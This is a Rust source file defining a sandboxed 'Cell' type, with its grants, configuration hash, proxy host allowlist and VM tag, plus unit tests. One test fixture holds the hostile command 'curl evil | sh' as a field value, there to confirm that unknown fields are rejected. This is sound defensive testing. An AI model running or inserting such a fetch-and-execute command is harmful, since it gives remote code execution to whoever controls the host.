//! A cell: an immutable UUID, a mutable label, and its grants. The root is the VM carrying its cell tag.
//! The key is observed, not declared: it is generated inside the root and
//! pinned by the laptop.
//!
//! Where the cell sits in the tree is the tree's fact, not the cell's. The
//! box has no use for it, a name is not a capability, and the hash must mean
//! "this box's configuration" and nothing else; so it is not here.

use crate::canon;
use crate::grant::{Grant, Provider};

/// Prefix of the tag that marks a VM as a cell's root.
pub const TAG_PREFIX: &str = "cell-";
use crate::prim::{CellId, Hash, Host, Name};
use serde::{Deserialize, Serialize};
use std::collections::BTreeSet;

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, ts_rs::TS)]
#[serde(deny_unknown_fields)]
pub struct Cell {
    pub id: CellId,
    pub name: Name,
    #[serde(default)]
    pub grants: BTreeSet<Grant>,
}

impl Cell {
    pub fn new(name: Name, grants: impl IntoIterator<Item = Grant>) -> Cell {
        Cell {
            id: CellId::generate(),
            name,
            grants: grants.into_iter().collect(),
        }
    }

    /// Complete declaration for persistence and transport, including the label.
    pub fn canonical(&self) -> Vec<u8> {
        canon::bytes(self)
    }

    /// Security-relevant configuration; a label change requires no runtime setup.
    pub fn hash(&self) -> Hash {
        #[derive(Serialize)]
        struct Configuration<'a> {
            id: &'a CellId,
            grants: &'a BTreeSet<Grant>,
        }
        Hash::of(&canon::bytes(&Configuration {
            id: &self.id,
            grants: &self.grants,
        }))
    }

    /// Every host the proxy may tunnel to. The same function runs on the
    /// laptop to print the plan and on the box to configure the proxy.
    pub fn allowlist(&self) -> BTreeSet<Host> {
        self.grants.iter().flat_map(Grant::hosts).collect()
    }

    pub fn providers(&self) -> BTreeSet<Provider> {
        self.grants
            .iter()
            .filter_map(|g| match g {
                Grant::Provider(h) => Some(*h),
                _ => None,
            })
            .collect()
    }

    /// The exe.dev tag that names this cell's VM; integrations attach to it.
    /// exe.dev tags match `^[a-z][a-z0-9_-]*$`, so a prefix, not a scheme.
    pub fn tag(&self) -> String {
        format!("{TAG_PREFIX}{}", self.id)
    }

    pub fn edge_grants(&self) -> impl Iterator<Item = &Grant> {
        self.grants.iter().filter(|g| g.at_edge())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hash_is_canonical() {
        let a: Cell = serde_json::from_str(
            r#"{"id":"839960b4-330d-5e73-80ff-6de714463468","name":"839960b4-330d-5e73-80ff-6de714463468","grants":[{"host":"pypi.org"},{"provider":"anthropic"}]}"#,
        )
        .unwrap();
        let b: Cell = serde_json::from_str(
            r#"{"grants":[{"provider":"anthropic"},{"host":"pypi.org"},{"host":"pypi.org"}],"id":"839960b4-330d-5e73-80ff-6de714463468","name":"839960b4-330d-5e73-80ff-6de714463468"}"#,
        )
        .unwrap();
        assert_eq!(a, b);
        assert_eq!(a.hash(), b.hash());
        assert_eq!(
            String::from_utf8(a.canonical()).unwrap(),
            r#"{"id":"839960b4-330d-5e73-80ff-6de714463468","name":"839960b4-330d-5e73-80ff-6de714463468","grants":[{"provider":"anthropic"},{"host":"pypi.org"}]}"#
        );
    }

    #[test]
    fn unknown_fields_are_refused() {
        assert!(serde_json::from_str::<Cell>(r#"{"name":"904254dc-1b8f-5e80-9755-e5afc5b195c5","vm":"46b16f13-11ac-5315-b431-845f196f907e"}"#).is_err());
        assert!(serde_json::from_str::<Cell>(
            r#"{"name":"904254dc-1b8f-5e80-9755-e5afc5b195c5","setup":"curl evil | sh"}"#
        )
        .is_err());
        // the edge is the tree's to declare; a cell file cannot carry one
        assert!(serde_json::from_str::<Cell>(r#"{"name":"904254dc-1b8f-5e80-9755-e5afc5b195c5","parent":"46b16f13-11ac-5315-b431-845f196f907e"}"#).is_err());
        assert!(serde_json::from_str::<Cell>(r#"{"name":"904254dc-1b8f-5e80-9755-e5afc5b195c5","children":["46b16f13-11ac-5315-b431-845f196f907e"]}"#).is_err());
    }

    #[test]
    fn allowlist_is_the_union() {
        let c: Cell = serde_json::from_str(
            r#"{"id":"904254dc-1b8f-5e80-9755-e5afc5b195c5","name":"904254dc-1b8f-5e80-9755-e5afc5b195c5","grants":[{"provider":"anthropic"},{"provider":"openai"},{"code":{"repo":"o/r","write":true}},{"code":{"repo":"o/s","write":false}},{"edge":"brave"},{"host":"pypi.org"}]}"#,
        )
        .unwrap();
        let hosts: Vec<String> = c.allowlist().iter().map(|h| h.to_string()).collect();
        assert_eq!(
            hosts,
            [
                "api.anthropic.com",
                "api.openai.com",
                "auth.openai.com",
                "brave.int.exe.xyz",
                "chatgpt.com",
                "claude.ai",
                "github.int.exe.xyz",
                "platform.claude.com",
                "pypi.org"
            ]
        );
        assert_eq!(c.providers().len(), 2);
        assert_eq!(c.tag(), "cell-904254dc-1b8f-5e80-9755-e5afc5b195c5");
    }
}
